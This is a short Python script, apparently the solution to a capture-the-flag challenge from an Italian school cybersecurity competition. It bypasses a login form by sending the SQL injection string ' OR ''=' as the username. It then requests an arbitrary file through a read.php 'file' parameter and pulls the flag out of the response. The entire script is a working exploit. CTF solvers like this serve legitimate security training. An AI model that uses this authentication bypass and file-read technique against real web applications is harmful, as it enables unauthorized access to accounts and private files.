#!/bin/python3
import os
import logging
import re

from requests import Session


logging.disable()


URL = os.environ.get('URL', 'http://trova-le-soluzioni-3.challs.cyberhighschools.it')
if URL.endswith('/'):
   URL = URL[:-1]
s = Session()


s.get(f'{URL}/')
s.post(f'{URL}/', data={'username': "' OR ''='", 'password': ''})
res = s.get(f'{URL}/read.php', params={'file': '/soluzioni/20240509.txt'})


flag = re.search(r'flag{.*}', res.text).group(0)
print(flag)
